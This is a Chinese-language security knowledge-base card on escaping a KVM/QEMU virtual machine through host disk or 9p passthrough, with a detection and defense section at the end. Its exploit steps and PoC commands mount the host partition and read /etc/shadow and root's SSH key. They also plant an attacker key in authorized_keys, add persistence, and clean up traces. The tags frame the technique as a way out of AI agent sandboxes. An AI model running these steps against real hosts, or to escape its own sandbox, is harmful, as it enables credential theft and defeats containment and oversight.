---
id: binary-pwn-sandbox-escape-kvm-block-device-mount-host-escape
title: KVM 虚拟机内 root + 宿主机块设备透传：挂载 /dev/sdb 读写宿主机文件逃逸
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: vm-block-device-mount-escape
aliases:
- 虚拟机逃逸
- 块设备挂载逃逸
- KVM 磁盘透传逃逸
- 9p 共享目录逃逸
- Agent 沙箱逃逸
tags:
- sandbox-escape
- kvm
- qemu
- vm-escape
- block-device
- mount
- agent-sandbox
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V106
  verified_at: '2026-11-05T22:39:38+08:00'
  notes: 已对照原文核对：块设备/9p 两类逃逸、guest root 前提、只读挂载、缺 XFS 驱动、脏日志、LUKS 加密分支及完整 mount/dd 命令均与原文一致。原文明确是初学者学习笔记中的场景推演，未附真实环境执行日志；卡片已在边界中如实说明，confidence medium 合理。技术链为标准 Linux 挂载行为，最终危害（读 /etc/shadow、写 authorized_keys）明确；无产品版本，未设 versions；frontmatter 无 sources/source_url。
---

## 一句话结论

当 KVM/QEMU 宿主机错误地把物理磁盘或分区（如 `/dev/sdb1`）透传进虚拟机，且攻击者已取得虚拟机内 root 时，可在 guest 内直接 `mount` 宿主机文件系统，读取 `/etc/shadow`、SSH 私钥，或在可写时向 `authorized_keys` 写入公钥完成持久化；即使块设备只读，`-o ro` 挂载仍可完成信息泄露型逃逸。

## 原理

- `mount` 是内核特权系统调用，普通用户不能把任意块设备挂到任意挂载点；块设备文件本身还有权限（常见 `brw-rw---- root disk`），非 root 且不在 `disk` 组的用户连读都会 `Permission denied`。
- 块设备透传把宿主机分区直接暴露给 guest 内核。guest 内挂载后，VFS 直接解析宿主机文件系统，读写的正是宿主机磁盘上的文件，虚拟化边界被绕过。
- 逃逸能否成功取决于一组环境条件，任一不满足都会在挂载阶段失败：
  - 块设备被虚拟化层设为只读：读写挂载报 `cannot mount ... read-write`，改用 `mount -o ro` 可读，但无法写入后门。
  - guest 内核缺少宿主机文件系统驱动（如 XFS）：报 `unknown filesystem type 'xfs'`，可 `modprobe xfs`，或 `dd` 导出整块分区镜像到本地离线解析。
  - 文件系统日志为 dirty（宿主机未正常卸载）：ext4 默认拒绝读写挂载，`-o ro` 可绕过脏日志检查。
  - 分区为 LUKS 加密：`mount` 看到的是 `crypto_LUKS` 容器，没有解密密钥时块设备全为密文，`dd` 导出也只是密文镜像，逃逸失败。
- 另一类是 9p 共享文件系统：宿主机只把一个目录共享给 guest，而不是整块磁盘；同样需要 guest root 与 mount 能力，成功时只影响共享目录，影响面小于块设备透传，但足以读写该目录内的宿主机文件。

## 触发条件

- 攻击者已取得虚拟机内 root（例如通过 Web 漏洞拿到 shell 后本地提权）；
- 宿主机配置错误：将宿主机物理磁盘/分区以块设备方式透传给 guest（virtio-blk 指向 `/dev/sdX`、QEMU `host_device` 等），或通过 9p 共享了敏感宿主机目录；
- 块设备对 guest root 可读（只读即可造成信息泄露，可写则可持久化）；
- guest 内核具备对应文件系统驱动，或可加载模块/导出镜像离线解析；
- 分区未使用 LUKS 等全盘加密，或攻击者同时掌握解密密钥。

## 利用步骤

1. 枚举 guest 内可见的块设备：`lsblk`、`cat /proc/partitions`、`dmesg | grep -i sd`，寻找异常多出的 `/dev/sdb`、`/dev/vdb` 等。
2. 检查设备权限与只读状态：`ls -l /dev/sdb1`、`blockdev --getro /dev/sdb1`；确认当前为 root 或在 `disk` 组。
3. 创建挂载点并尝试读写挂载：`mkdir -p /mnt/host && mount /dev/sdb1 /mnt/host`。
4. 按报错处理：
   - 只读设备：`mount -o ro /dev/sdb1 /mnt/host`；
   - 缺文件系统驱动：`modprobe xfs`（或对应模块）；失败则 `dd if=/dev/sdb1 of=/tmp/host.img`，下载镜像到有驱动的机器离线挂载；
   - 脏日志：改用 `-o ro`；
   - `crypto_LUKS`：无密钥则停止，块设备为密文。
5. 挂载成功后浏览宿主机文件：读取 `/mnt/host/etc/shadow` 做口令爆破、读取 `/mnt/host/root/.ssh/id_rsa`；若为读写挂载，向 `/mnt/host/root/.ssh/authorized_keys` 追加攻击者公钥，或用 crontab/systemd 写入持久化后门。
6. 清理挂载点与临时镜像，避免在 guest 内留下明显痕迹。

## PoC

```bash
# 1. 识别透传块设备
lsblk
ls -l /dev/sdb1
blockdev --getro /dev/sdb1   # 1 表示只读

# 2. 挂载宿主机分区（只读设备改用 -o ro）
mkdir -p /mnt/host
mount /dev/sdb1 /mnt/host

# 3. 读取宿主机敏感文件
cat /mnt/host/etc/shadow
cat /mnt/host/root/.ssh/id_rsa

# 4. 可写时写入 SSH 公钥持久化
echo "ssh-ed25519 AAAA... attacker@host" >> /mnt/host/root/.ssh/authorized_keys
```

失败场景的最小处理：

```bash
# 只读透传
mount -o ro /dev/sdb1 /mnt/host

# 缺少 XFS 驱动
modprobe xfs || dd if=/dev/sdb1 of=/tmp/host-sdb1.img

# 脏日志
mount -o ro /dev/sdb1 /mnt/host
```

## 变体与关联

- 变体：只读逃逸。设备只读或文件系统 dirty 时用 `-o ro`，只能读取宿主机文件，适合凭据窃取与信息收集。
- 变体：9p 共享目录。宿主机共享单个目录时，guest root 挂载 9p 文件系统即可读写该目录；影响面限于共享目录，但常包含部署配置、密钥或源码。
- 变体：离线解析。guest 缺少文件系统驱动时，用 `dd` 导出分区镜像，在攻击者本地挂载/取证工具中读取。
- 关联 [[cloud-container-docker-privileged-host-disk-escape]]：容器特权模式挂载宿主机磁盘的同类思路，区别是本卡发生在 KVM guest 而非容器。
- 关联 [[binary-pwn-sandbox-escape-qemu-pci-mmio-oob-function-pointer-escape]]：同属 QEMU/KVM 逃逸，该卡利用设备 MMIO 内存破坏，本卡利用宿主机透传配置，前者需要漏洞，后者只需要错误配置 + guest root。
- 边界：原文为学习笔记中的场景推演，未附真实环境执行日志；挂载命令与失败分支是标准 Linux 操作，结论依赖宿主机确实透传了块设备或 9p 目录、且 guest 已获 root 这两个前提成立。

## 检测与防御

- **宿主机配置**：不要向不可信 guest 透传宿主机物理磁盘或分区；为每个 VM 使用独立磁盘镜像/overlay，禁止 `host_device` 直通；必须共享时使用只读、最小目录的 9p，并限制可访问路径。
- **加密与权限**：宿主机敏感分区使用 LUKS；限制 `/dev/sdX` 节点权限；用 device cgroup/seccomp 限制 guest 对块设备的访问；AI Agent 沙箱使用无宿主机块设备、无敏感 9p 共享的隔离 VM。
- **检测**：审计 libvirt XML 与 QEMU 命令行中的 `<source dev='/dev/sdX'/>`、`-drive file=/dev/...`、`host_device`、9p `mount_tag`；监控宿主机 `/root/.ssh/authorized_keys`、crontab、systemd 单元的变化；对 guest 内出现宿主机分区挂载的告警（如有 guest 遥测）。
- **响应**：发现透传配置立即下线该 VM、移除块设备/9p 共享，检查宿主机是否已被读取 `/etc/shadow`、写入 SSH 公钥或植入持久化，并轮换宿主机凭据。
